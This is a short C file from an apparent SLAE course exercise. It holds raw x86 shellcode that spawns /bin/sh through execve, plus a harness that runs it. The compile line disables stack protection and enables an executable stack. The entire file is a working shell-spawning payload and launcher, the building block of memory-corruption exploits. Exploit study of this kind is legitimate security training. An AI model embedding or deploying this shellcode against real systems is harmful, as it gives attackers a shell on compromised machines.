/*
Filename:      shellcode.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  12.12.2018
Note:          x86 code but compiled on x64
Compiler:      gcc -m32 -ggdb -fno-stack-protector -z execstack shellcode.c -o shellcode
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
